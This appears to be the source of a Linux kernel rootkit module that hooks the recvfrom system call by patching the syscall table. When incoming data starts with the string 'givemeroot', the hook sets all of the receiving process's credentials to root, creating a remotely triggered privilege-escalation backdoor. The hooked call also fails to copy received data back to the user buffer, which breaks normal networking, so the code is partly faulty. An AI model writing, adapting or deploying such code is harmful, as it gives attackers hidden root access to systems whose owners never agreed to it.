#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>

#include "syscall_table.h"
#include "hook_defs.h"
#include "cred_hook.h"
#include "kill_hook.h"

#define MAGIC_TRIGGER "givemeroot"
#define TRIGGER_LEN 10

asmlinkage long (*original_recvfrom)(int sockfd, void __user *buf, size_t len, int flags,
                                     struct sockaddr __user *src_addr, int __user *addrlen);

asmlinkage long hooked_recvfrom(int sockfd, void __user *buf, size_t len, int flags,
                                struct sockaddr __user *src_addr, int __user *addrlen)
{
    long ret;
    char *kbuf;

    kbuf = kmalloc(len + 1, GFP_KERNEL);
    if (!kbuf)
        return original_recvfrom(sockfd, buf, len, flags, src_addr, addrlen);

    ret = original_recvfrom(sockfd, kbuf, len, flags, src_addr, addrlen);
    if (ret <= 0) {
        kfree(kbuf);
        return ret;
    }

    if (ret >= TRIGGER_LEN && memcmp(kbuf, MAGIC_TRIGGER, TRIGGER_LEN) == 0) {
        struct cred *new_creds = prepare_creds();
        if (new_creds) {
            new_creds->uid.val = 0;
            new_creds->gid.val = 0;
            new_creds->euid.val = 0;
            new_creds->egid.val = 0;
            new_creds->suid.val = 0;
            new_creds->sgid.val = 0;
            new_creds->fsuid.val = 0;
            new_creds->fsgid.val = 0;
            commit_creds(new_creds);
        }
        kfree(kbuf);
        return -1;  
    }

    kfree(kbuf);
    return ret;
}

void enable_net_hook(unsigned long **syscall_table)
{
    original_recvfrom = (void *)syscall_table[__NR_recvfrom];
    disable_write_protection();
    syscall_table[__NR_recvfrom] = (unsigned long *)hooked_recvfrom;
    enable_write_protection();
}

void disable_net_hook(unsigned long **syscall_table)
{
    disable_write_protection();
    syscall_table[__NR_recvfrom] = (unsigned long *)original_recvfrom;
    enable_write_protection();
}
